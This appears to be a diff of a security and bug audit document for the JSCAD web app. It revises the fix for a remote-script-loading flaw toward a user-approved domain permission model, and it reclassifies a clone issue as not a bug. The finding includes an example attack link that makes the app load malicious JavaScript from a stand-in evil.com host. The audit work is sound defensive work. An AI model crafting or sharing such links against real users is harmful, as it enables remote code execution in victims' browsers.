@@ -23,29 +23,47 @@ if (url) {
 Any public URL in the hash fragment is fetched and executed as JavaScript. An attacker can craft a link like `https://jscad.app/#https://evil.com/malicious.js` and share it.
 
 **Proposed Fix:**
-Add a Content Security Policy and/or domain allowlist for remote scripts. The application's intended function is to load JSCAD scripts from trusted sources (user's own files, examples, trusted CDNs).
+Implement a user-permission model with no default trusted domains. User must explicitly approve each new domain/path pattern before scripts are loaded.
 
 **Why this doesn't break functionality:**
 - Users loading local files: Unaffected (uses File System API, not URL hash)
-- Users loading from hash: Can still load from allowlisted domains (github gists, specific CDNs)
-- The `isValidRemoteUrl` function already exists in `serve.js` - extend this pattern
+- Users loading from URL: Prompted once per domain/pattern, can save to trusted list
+- Power users can pre-configure trusted patterns in settings
 
 **Implementation:**
-```javascript
-const ALLOWED_REMOTE_DOMAINS = [
-  'gist.githubusercontent.com',
-  'raw.githubusercontent.com',
-  'cdn.jsdelivr.net',
-  // User can configure additional domains
-]
 
-const isAllowedRemoteUrl = (urlString) => {
-  try {
-    const url = new URL(urlString)
-    return ALLOWED_REMOTE_DOMAINS.some(domain => url.hostname.endsWith(domain))
-  } catch { return false }
+1. **Permission Dialog** - When loading from untrusted URL:
+```
+┌─────────────────────────────────────────────────────┐
+│  Load script from untrusted source?                 │
+│                                                     │
+│  https://example.com/models/gear.js                 │
+│                                                     │
+│  ☐ Trust all scripts from example.com               │
+│  ☐ Trust scripts matching: /models/.*\.js$          │
+│                                                     │
+│  [Cancel]                    [Load Once]  [Allow]   │
+└─────────────────────────────────────────────────────┘
+```
+
+2. **Storage Structure** (localStorage):
+```javascript
+{
+  "rules": [
+    { "domain": "gist.githubusercontent.com", "pathPattern": ".*" },
+    { "domain": "example.com", "pathPattern": "/models/.*\\.js$" }
+  ]
 }
 ```
+
+3. **CRUD Settings Dialog** - In options dropdown menu:
+   - List all saved rules with domain and path pattern
+   - Add new rule (domain input + path regex input)
+   - Edit existing rules
+   - Delete rules
+   - Test URL against rules
+
+4. **No default trusted domains** - Even github/gist require explicit user approval
 
 ---
 
@@ -256,11 +274,14 @@ const normalizePath = (path) => {
 **Location:** `packages/manifold/src/geometries/ManifoldGeom3.js:295-299`
 **Type:** Logic Error
 **Effort:** Medium
-**Status:** Open
+**Status:** Not a bug
 
 **Problem:** Clone reuses same Manifold object.
 
-**Fix:** Use Manifold's copy/clone method if available, or convert to mesh and back.
+**Assessment:** This is actually correct behavior. Manifold objects are immutable - all operations
+(subtract, union, transform, etc.) return NEW Manifold objects rather than mutating in place.
+Sharing the reference is safe and matches JSCAD's geom3.clone() pattern. Added explanatory
+comment to the code.
 
 ---
 
@@ -561,9 +582,12 @@ Add TypeScript declaration files for consumers.
 - L1 (duplicate reload logic)
 
 ### Medium Effort (Open)
-- H4, H5, H6, H7, H8, H9
+- H4, H5, H6, H7, H9
 - M15, M16, M18, M19, M20
 - L2
+
+### Not a Bug
+- H8 (ManifoldGeom3.clone() - immutable objects, sharing reference is correct)
 
 ### High Effort (Open)
 - C1, C3, C4
